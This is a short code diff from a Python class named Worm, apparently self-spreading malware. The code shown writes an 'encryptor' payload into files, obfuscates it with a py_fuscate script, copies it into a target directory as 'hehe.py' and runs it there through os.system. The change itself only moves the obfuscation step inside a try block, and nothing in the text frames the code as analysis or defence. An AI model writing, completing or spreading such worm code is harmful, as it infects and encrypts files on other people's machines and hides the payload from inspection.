@@ -52,10 +52,9 @@ class Worm:
             with open(to_infect, "w") as tf:
                 tf.write(encryptor)
 
-            os.system(f"python.exe ./py_fuscate.py -i {to_infect} -o {to_infect_o} -c 100")
-
             try:
                 with open(target + "/hehe.py", "w") as f:
+                    os.system(f"python.exe ./py_fuscate.py -i {to_infect} -o {to_infect_o} -c 100")
                     with open(to_infect_o, "r") as fe:
                         f.write(fe.read())
                 os.system("cd " + target + " && python.exe hehe.py && cd " + THIS_DIR)
